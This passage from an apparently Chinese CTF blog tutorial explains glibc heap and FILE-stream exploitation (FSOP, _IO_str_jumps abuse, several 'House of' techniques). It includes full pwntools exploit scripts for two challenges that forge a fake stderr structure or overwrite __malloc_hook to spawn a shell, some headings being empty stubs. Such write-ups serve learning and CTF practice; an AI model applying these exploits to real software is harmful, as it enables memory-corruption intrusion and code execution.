<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">JUMP_INIT_DUMMY,</span><br><span class="line">JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">JUMP_INIT(read, _IO_default_read),</span><br><span class="line">JUMP_INIT(write, _IO_default_write),</span><br><span class="line">JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">JUMP_INIT(close, _IO_default_close),</span><br><span class="line">JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>不难看出，在<strong>该表中有我们所需的_IO_str_finish函数，且该表本身便是vtable表列表中的一个表</strong>，能很好地通过vtable表合法性检测，因此我们劫持stdout时便尝将fake vtable劫持到该表附近</p>
<p>需要注意的一点是我们需要<strong>修改_IO_2_1_stdout的flag的最后一位为0以通过_IO_str_finish函数中的检测</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio/strops.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br></pre></td></tr></table></figure>

<p>64位下其会<strong>将fp + 0d8 + 0x10的位置作为函数指针进行调用</strong></p>
<p><img src="https://i.loli.net/2021/01/28/8xEXo4kUA5Z9JMu.png" alt="image.png"></p>
<p>需要注意的是<strong>这种利用方式仅适用于glibc2.28以下的版本，自glibc2.28始该段代码被修改，无法再通过同种方式进行利用</strong></p>
<p>自glibc2.28始，该函数<strong>不会调用额外的函数指针</strong>，而是会<code>直接使用free()</code>，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类似地，<strong>对于_IO_str_overflow的利用自glibc2.28始同样失效</strong>，源码比较长就不在这里贴出了</p>
<p>参考：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-finish">ctf-wiki: exploit in libc2.24</a></p>
</blockquote>
<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP即 File Stream Oriented Programme——文件流导向编程，即基于 glibc 中文件流相关的一种劫持手法，其核心思想便是通过劫持文件流的相关流程以达到控制程序执行流的目的，通常是  <code>_IO_flush_all_lockp()</code> 的相关流程</p>
<h4 id="IO-list-all-链表"><a href="#IO-list-all-链表" class="headerlink" title="_IO_list_all 链表"></a>_IO_list_all 链表</h4><p>在 glibc 中使用 <code> _IO_FILE</code> 结构描述一个文件， 进程中的 <code> _IO_FILE</code> 结构会通过其 _chain 成员彼此连接形成一个链表，在全局变量 <strong>_IO_list_all</strong> 中储存着指向该链表头节点的指针，通过这个值我们可以遍历所有的 FILE 结构 </p>
<p>在  _IO_FILE 结构上其实还有一层套娃结构叫 <code> _IO_FILE_plus</code> ，其中新增一个 vtable 指针指向该文件流会用到的虚函数表</p>
<p>通常情况下进程创建时会自动打开三个文件，其链接顺序为：<code>stderr-&gt;stdout-&gt;stdin</code>，即在 <strong>_IO_list_all</strong> 中储存着的是指向 <code>_IO_2_1_stderr_</code> 的指针</p>
<h4 id="IO-flush-all-lockp"><a href="#IO-flush-all-lockp" class="headerlink" title="_IO_flush_all_lockp()"></a>_IO_flush_all_lockp()</h4><p>常见的 FSOP 手法主要是通过 <code>_IO_flush_all_lockp()</code> 进行利用，这个函数在以下情况会被调用：</p>
<ul>
<li>通过 libc 相关机制触发 abort</li>
<li>通过 exit() 执行流程<ul>
<li>由 main 函数返回至 <code>__libc_start_main()</code> 后执行 <code>exit()</code></li>
</ul>
</li>
</ul>
<p>该函数定义于libio&#x2F;genops.c中，会刷新_IO_list_all链表中所有项的文件流 ，我们主要关注其中的如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>中间的那一段宏一般为假，我们暂且先不管</p>
</blockquote>
<p>那么其会检查如下两个条件：</p>
<ul>
<li><strong>fp-&gt;_mode &lt;&#x3D; 0</strong></li>
<li><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></li>
</ul>
<p>按照程序执行流程，在这两个条件通过之后便会使用宏<code>_IO_OVERFLOW()</code>，其定义于libio&#x2F;libioP.h中，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>

<p>由此可知其<strong>最终会调用vtable表中的</strong><code>__overflow</code><strong>函数，且第一个参数为指向FILE自身的指针</strong></p>
<h4 id="例题：ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><a href="#例题：ciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP" class="headerlink" title="例题：ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP"></a>例题：ciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</h4><p>惯例的<code>checksec</code>，保  护  全  开（噔  噔  咚</p>
<p><img src="https://i.loli.net/2021/01/28/eBdwI7PSxn3ypCO.png" alt="image.png"></p>
<p>拖入IDA进行分析，可知该程序有着分配、编辑、打印堆块的功能</p>
<p>但是我们<strong>仅能够分配一个堆块，且无法释放堆块</strong></p>
<p><img src="https://i.loli.net/2021/01/28/9aomlHGesxkAqrF.png" alt="image.png"></p>
<p>漏洞点在于创建&#x2F;编辑堆块时输入作者姓名时<strong>存在溢出，可以覆写掉与其相邻的堆块指针</strong>，在接下来的编辑中我们便可以<strong>实现任意地址写</strong></p>
<p><img src="https://i.loli.net/2021/01/28/Lq7cFMxUl6ytRiG.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/01/28/HnhJeRX21OWp5Mq.png" alt="image.png"></p>
<p>同时，<strong>输入666则可直接泄露libc地址</strong></p>
<p><img src="https://i.loli.net/2021/01/28/D3g5PRshQfFxVy6.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/01/28/hUdkKbNwqr2WZap.png" alt="image.png"></p>
<p>由于 glibc2.23 中未加入对 vtable 表的合法性检测，故我们可以考虑直接劫持 <code>_IO_2_1_stderr_</code> 及其vtable表执行<code>system(&quot;/bin/sh&quot;)</code>以 get shell（stderr为FILE链表的头结点），其中由于 <code>__overflow() </code>函数会将指向FILE的指针作为其第一个参数，故考虑将 “&#x2F;bin&#x2F;sh” 字符串构造于 fake file 的开头</p>
<p>构造 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;, 26348)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)<span class="comment">#ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>((p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input string Length: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])<span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)<span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x10</span>) <span class="comment"># fake vtable</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;New contents:&quot;</span>)</span><br><span class="line">p.send(fake_file)</span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可get shell</p>
<p><img src="https://i.loli.net/2021/01/31/HItF2WqQlb6kyTZ.png" alt="image.png"></p>
<h1 id="0x04-更加高级的攻击手法"><a href="#0x04-更加高级的攻击手法" class="headerlink" title="0x04.更加高级的攻击手法"></a>0x04.更加高级的攻击手法</h1><blockquote>
<p>下面的中文译名都是瞎取的233333</p>
</blockquote>
<p>House of XX 系列是在堆利用中由一些基础的利用技巧组合而来的更为复杂利用手法</p>
<h2 id="House-of-Botcake-机饼の所"><a href="#House-of-Botcake-机饼の所" class="headerlink" title="House of Botcake - 机饼の所"></a>House of Botcake - 机饼の所</h2><p>主要思想是通过对于垂悬指针的利用使得在 tcache 与 unsorted bin 中有着同一个 chunk</p>
<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h2 id="House-of-Einherjar-英灵の屋"><a href="#House-of-Einherjar-英灵の屋" class="headerlink" title="House of Einherjar - 英灵の屋"></a>House of Einherjar - 英灵の屋</h2><p>通过伪造 fake prev_size 以在 chunk 合并的过程中达成 overlapping</p>
<h3 id="例题：2016-Seccon-tinypad"><a href="#例题：2016-Seccon-tinypad" class="headerlink" title="例题：2016 Seccon tinypad"></a>例题：2016 Seccon tinypad</h3><h2 id="House-of-Force-力の金阁（not-available-from-glibc-2-29）"><a href="#House-of-Force-力の金阁（not-available-from-glibc-2-29）" class="headerlink" title="House of Force - 力の金阁（not available from glibc 2.29）"></a>House of Force - 力の金阁（not available from glibc 2.29）</h2><p>House of Force 主要基于的是对于 top chunk 的利用，若是我们能够通过诸如堆溢出等手段将 top chunk 的 size 改成一个较大值（如0xfffffffffffffff1），且程序不限制我们所分配的 chunk 的大小，则我们可以通过分配任意大小的 chunk 以恰当的偏移切割 top chunk 以达到任意地址写的效果</p>
<p><strong>自 glibc2.29 起新增了对 top chunk size 的合法性检查，house of force 就此失效</strong></p>
<blockquote>
<p>时代的眼泪了（x</p>
</blockquote>
<h3 id="例题：gyctf-2020-force-House-of-Force"><a href="#例题：gyctf-2020-force-House-of-Force" class="headerlink" title="例题：gyctf_2020_force - House of Force"></a>例题：gyctf_2020_force - House of Force</h3><p>惯例的 <code>checksc</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/05/03/T4nS6jVxFpBUI3J.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>只有一个分配堆块的功能，<strong>不限制大小</strong>，会给出堆块地址，最多写入 <code>0x50</code> 字节，若是分配小堆块则毫无疑问可以溢出</p>
<p><img src="https://i.loli.net/2021/05/03/ND1y5ezRKtEP6X8.png" alt="image.png"></p>
<p>没有 free 功能，也没法打印，唯一的输出点是输出堆块的地址，由于其不限制 size 的大小，不难想到若是我们分配一个特别大的 chunk ，sys_malloc 便会通过 MMAP 系统调用分配一块空间，<strong>刚好挨着 libc 映射的空间</strong>，由此我们便可以获得 libc 的地址</p>
<p>有溢出，libc 2.23 ，可以考虑通过 House of Force 劫持 top chunk 进行任意地址写改 __malloc_hook 为 one_gadget，以及别忘了 realloc 调栈</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./gyctf_2020_force&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25534</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;2:puts&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;bin addr &quot;</span>)</span><br><span class="line">    chunk_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    <span class="keyword">return</span> chunk_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    libc_leak = new(<span class="number">0x2000000</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x10</span> + <span class="number">0x2000000</span> + <span class="number">0x1000</span> <span class="comment"># chunk header</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    heap_leak = new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line">    top_chunk = heap_leak + <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">&#x27;top chunk: &#x27;</span> + <span class="built_in">hex</span>(top_chunk))</span><br><span class="line"></span><br><span class="line">    new(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - top_chunk - <span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + <span class="number">0x4526a</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;2:puts&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/03/hG4lYofbJRq7aKr.png" alt="image.png"></p>
<h2 id="House-of-Husk-壳层の仓"><a href="#House-of-Husk-壳层の仓" class="headerlink" title="House of Husk - 壳层の仓"></a>House of Husk - 壳层の仓</h2><p>主要是利用 printf 系函数的调用链</p>
<p>大概流程：</p>
<ol>
<li>泄露 libc 地址</li>
<li>unsortedbin attack 把 global_max_fast 变大</li>
<li>用相对覆写把 fake arginfo table 地址写到 __printf_arginfo_table</li>
<li>用相对覆写把 __printf_function_table 写为 NULL</li>
<li>调用带格式化字符串的 printf</li>
</ol>
<h3 id="例题：CCISC2020-华东北赛区-Pwn5"><a href="#例题：CCISC2020-华东北赛区-Pwn5" class="headerlink" title="例题：CCISC2020-华东北赛区-Pwn5"></a>例题：CCISC2020-华东北赛区-Pwn5</h3><h2 id="House-of-Kiwi-飞鸟の笼异果の篮"><a href="#House-of-Kiwi-飞鸟の笼异果の篮" class="headerlink" title="House of Kiwi - 飞鸟の笼异果の篮"></a>House of Kiwi - <del>飞鸟の笼</del>异果の篮</h2><blockquote>
<p>Kiwi 是这只🐦🦄？（x</p>
<p><img src="https://bkimg.cdn.bcebos.com/pic/fcfaaf51f3deb48fdf81ac65f71f3a292cf578a4?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U4MA==,g_7,xp_5,yp_5/format,f_auto" alt="img.png"></p>
<p>nope，是<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598"> 🥝 </a></p>
<p><img src="https://p3.ssl.qhimg.com/t016933e48a0f026951.jpg" alt="image.png"></p>
</blockquote>
<p>House of  🥝 为对 <code>_IO_file_jumps</code>中的sync指针的🥝的劫持，算是比较偏门的一个🥝，在 <code>exit()</code> 函数被换为 <code>_exit()</code> 或是其他无法调用到 <code>_IO_cleanup()</code> 时的一种特殊的  FSOP 手段</p>
<p>主要🥝思路是通过触发 <code>__malloc_assert()</code>  调用 <code>_IO_file_jumps</code> 中的 sync 🥝指针</p>
<h3 id="例题：-NepCTF2021-NULL-FxCK"><a href="#例题：-NepCTF2021-NULL-FxCK" class="headerlink" title="例题：  NepCTF2021 NULL_FxCK"></a>例题：  NepCTF2021 NULL_FxCK</h3><h2 id="House-of-Lore-传说の屋"><a href="#House-of-Lore-传说の屋" class="headerlink" title="House of Lore - 传说の屋"></a>House of Lore - 传说の屋</h2><p>small bin attack，需要我们能够控制 small bin 最后一个 chunk 的 bk 指针</p>
<h3 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h3><h2 id="House-of-Orange-新橙の室"><a href="#House-of-Orange-新橙の室" class="headerlink" title="House of Orange - 新橙の室"></a>House of Orange - 新橙の室</h2><p>House of Orange 是一种较为特殊的🍊利用方式，主要针对于<strong>没有 free 的特殊场景</strong>，在无法使用 free() 释放堆块的特殊情况下，我们需要通<strong>过对漏洞的利用以完成 free 的效果</strong></p>
<p>通常情况下，🍊选择劫持 top chunk：当 top chunk 的 size 不足以满足需求时，原有的 top chunk <strong>会被释放，放入 unsorted bin 中</strong>，随后 ptmalloc2 通过 brk 系统调用扩展堆区，此时我们便获得了一个 unsorted bin chunk</p>
<p>需要注意的是我们所请求的 size 不能够大于 <code>mmp_.mmap_threshold </code>（通常为 128k），否则 ptmalloc2 将会直接采用 mmap 系统调用分配内存</p>
<p>我们还需要绕过如下检测：</p>
<ul>
<li>Top chunk 需要对内存页（通常是0x1000）对齐</li>
<li>size 需要大于 MINSIZE 而小于 request + MINSIZE</li>
<li>PREV_INUSE 位需为 1</li>
</ul>
<p>接下来便是 House of Orange 这个🍊中最为精髓的🍊：通过 malloc 触发错误这条路径来以 FSOP 的方式 get shell</p>
